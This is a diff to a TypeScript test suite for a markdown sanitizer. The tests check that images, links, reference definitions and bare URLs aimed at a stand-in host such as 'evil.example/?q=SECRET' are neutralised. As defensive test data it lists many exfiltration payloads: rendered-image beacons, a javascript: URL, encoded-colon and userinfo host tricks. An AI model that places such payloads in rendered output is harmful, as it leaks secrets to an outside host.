@@ -136,9 +136,6 @@ describe("selectFindings", () => {
 describe("rendering code", () => {
   it("keeps generics and indexing readable, with no tag left", () => {
     assert.strictEqual(sanitize("`Array<string>`").replaceAll("\u200b", ""), "`Array<string>`");
-    assert.include(sanitize("use a[i](x) here"), "a[i](x)");
-    assert.notInclude(sanitize("[a](https://evil.example)"), "evil");
-    assert.notInclude(sanitize("[a](//evil.example)"), "evil");
   });
   it("matches a directory glob with its trailing slash", () => {
     assert.isTrue(isIgnored("lib/a.ts", ["lib/"]));
@@ -187,44 +184,58 @@ describe("rendering", () => {
     assert.notMatch(sanitize("title <"), /<$/);
     assert.strictEqual(sanitize("a < b and 1 > 0"), "a < b and 1 > 0");
   });
-  it("replaces images with alt text, wherever they point", () => {
-    assert.strictEqual(sanitize("![x](https://evil.example/?q=SECRET)"), "x");
-    assert.strictEqual(sanitize("![x](https://github.com/a.png)"), "x");
-    assert.notInclude(sanitize("!<b>[x](https://evil.example/)"), "evil");
+  it("leaves no image, link or definition that can reach another host", () => {
+    const evil = "https://evil.example/?q=SECRET";
+    const live = /!\[|\]\(|\]:/;
+
+    for (const hostile of [
+      `![x](${evil})`,
+      `![a\\]b](${evil})`,
+      `![\\[a](${evil})`,
+      "![a\\]b](https&colon;//evil.example/x.png?d=SECRET)",
+      `[a](${evil})`,
+      `[a](${evil} "t")`,
+      "[a](https&colon;//evil.example/?x=1)",
+      "[a](&sol;&sol;evil.example)",
+      "[a](< https://evil.example>)",
+      "[a](//evil.example)",
+      "[a](javascript:alert(1))",
+      "[a](https://github.com@evil.example/)",
+      "[a](https://evil.example\\@github.com/)",
+      "[a](https://github.com.evil.example/)",
+      "[a](https://notgithub.com/)",
+      "[a](https://github.com/x&colon;y)",
+      `[[a](${evil})](${evil})`,
+      `[x](${evil}`,
+      `](${evil})`,
+      `see [a]\n\n[a]: ${evil}`,
+      `> [a]: ${evil} "t"`,
+      `- [a\\]b]: ${evil}`,
+      `[a\nb]: ${evil}`,
+    ]) {
+      assert.notMatch(sanitize(hostile), live, hostile);
+    }
   });
-  it("keeps links only to github.com and its subdomains", () => {
-    assert.strictEqual(sanitize("[a](https://evil.example/x)"), "a");
-    assert.strictEqual(sanitize('[a](https://evil.example/x "t")'), "a");
-    assert.strictEqual(sanitize("[a](https://evil.example/(y))"), "a");
-    assert.strictEqual(sanitize("[a](https://github.com@evil.example/)"), "a");
-    assert.strictEqual(sanitize("[a](https://evil.example\\@github.com/)"), "a");
-    assert.strictEqual(sanitize("[a](https://github.com.evil.example/)"), "a");
-    assert.strictEqual(sanitize("[a](https://notgithub.com/)"), "a");
-    assert.strictEqual(sanitize("[a](javascript:alert(1))"), "a");
+  it("stops bare URLs autolinking, except to GitHub", () => {
+    assert.notInclude(sanitize("https://evil.example/?d=SECRET"), "://");
+    assert.notInclude(sanitize("https://github.com.evil.example/"), "://");
+    assert.notInclude(sanitize("https://github.com@evil.example/"), "://");
+    assert.notInclude(sanitize("www.evil.example"), "www.e");
+    assert.include(sanitize("see https://github.com/o/r"), "https://github.com/o/r");
+  });
+  it("keeps plain GitHub links, never as images", () => {
+    assert.notInclude(sanitize("![x](https://github.com/a.png)"), "![");
     assert.strictEqual(sanitize("[a](https://github.com/o/r)"), "[a](https://github.com/o/r)");
     assert.strictEqual(
       sanitize("[a](https://docs.github.com/x)"),
       "[a](https://docs.github.com/x)",
     );
   });
-  it("does not let removal reassemble a link or a tag", () => {
-    const evil = "https://evil.example/";
+  it("leaves readable text when it breaks a link", () => {
+    const plain = (text: string) => sanitize(text).replaceAll("\u200b", "");
 
-    assert.strictEqual(sanitize(`[[a](${evil})](${evil})`), "a");
-    assert.notInclude(sanitize(`[a]<b>(${evil})`), "](");
-    assert.notInclude(sanitize(`[a][](${evil})(${evil})`), "evil");
-    assert.notInclude(sanitize(`[<[a](${evil})b>x](${evil})`), "evil");
-    assert.notMatch(sanitize(`<[i](${evil})mg src=x>`), /<[a-z]/);
-  });
-  it("leaves no half link another field could complete", () => {
-    assert.notInclude(sanitize("[x](https://evil.example/?q="), "evil");
-    assert.notInclude(sanitize("](https://evil.example/)"), "evil");
-  });
-  it("drops reference-style definitions, also inside a quote or list", () => {
-    assert.notInclude(sanitize("see [a]\n\n[a]: https://evil.example/"), "evil");
-    assert.notInclude(sanitize('> [a]: https://evil.example/ "t"'), "evil");
-    assert.notInclude(sanitize("- [a\\]b]: https://evil.example/"), "evil");
-    assert.strictEqual(sanitize("arr[0]: value"), "arr[0]: value");
+    assert.strictEqual(plain("arr[0]: value"), "arr[0]: value");
+    assert.strictEqual(plain("use a[i](x) here"), "use a[i](x) here");
   });
   it("is idempotent", () => {
     const hostile = "[a](https://github.com/x) @u #1 GH-2 <[i](https://e.example)mg> ![x](y)";
